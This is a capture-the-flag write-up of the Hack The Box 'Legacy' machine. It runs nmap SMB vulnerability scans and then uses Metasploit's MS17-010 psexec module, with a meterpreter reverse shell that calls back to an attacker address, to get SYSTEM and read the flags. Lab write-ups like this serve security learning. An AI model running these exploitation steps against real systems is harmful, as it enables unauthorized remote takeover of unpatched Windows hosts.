## ---------->> Legacy <<-----------

-----

// We will start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.4 -p-
----

    Nmap scan report for 10.10.10.4
    Host is up (0.15s latency).
    Not shown: 65532 filtered ports
    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server
    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:27:62 (VMware)
    | smb-os-discovery: 
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2021-07-10T19:21:23+03:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)



// cannot coonect smb withouth autentication
// so we search nmap for smb vulnurabillities

    $ ls /usr/share/nmap/scripts/ | grep smb | grep vuln
----

    smb-vuln-conficker.nse
    smb-vuln-cve-2017-7494.nse
    smb-vuln-cve2009-3103.nse
    smb-vuln-ms06-025.nse
    smb-vuln-ms07-029.nse
    smb-vuln-ms08-067.nse
    smb-vuln-ms10-054.nse
    smb-vuln-ms10-061.nse
    smb-vuln-ms17-010.nse
    smb-vuln-regsvc-dos.nse
    smb-vuln-webexec.nse
    smb2-vuln-uptime.nse

// Lets run all nmap smb scripts on the host

    $ nmap --script smb-vuln* -Pn -p 445 -A 10.10.10.4
----

    Nmap scan report for 10.10.10.4
    Host is up (0.13s latency).

    PORT    STATE SERVICE      VERSION
    445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
    Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp

    Host script results:
    | smb-vuln-ms08-067: 
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2008-4250
    |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
    |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
    |           code via a crafted RPC request that triggers the overflow during path canonicalization.
    |           
    |     Disclosure date: 2008-10-23
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
    |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    
    

// We can see that its vulnerable to (MS08-067) and (ms17-010)

### ---Exploitation---

// Little search in exploit-db we can see that (ms17-010) avalible in MetaSploit

    $ msfconsole
----

    msf6 > use exploit/windows/smb/ms17_010_psexec
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.10.10.4
    rhosts => 10.10.10.4
    msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.17.8
    lhost => 10.10.17.8
    msf6 exploit(windows/smb/ms17_010_psexec) > set lport 1444
    lport => 1444
    msf6 exploit(windows/smb/ms17_010_psexec) > exploit


![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Legacy/1.png)


// We got NT/SYSTEM !

    meterpreter > sysinfo
    Computer        : LEGACY
    OS              : Windows XP (5.1 Build 2600, Service Pack 3).
    Architecture    : x86
    System Language : en_US
    Domain          : HTB
    Logged On Users : 1
    Meterpreter     : x86/windows

----

// We got the root and user flags!

    C:\Documents and Settings\john\Desktop>type user.txt
    type user.txt
    e69af0e.......................

    C:\Documents and Settings\Administrator\Desktop>type root.txt
    type root.txt
    993442d2.....................


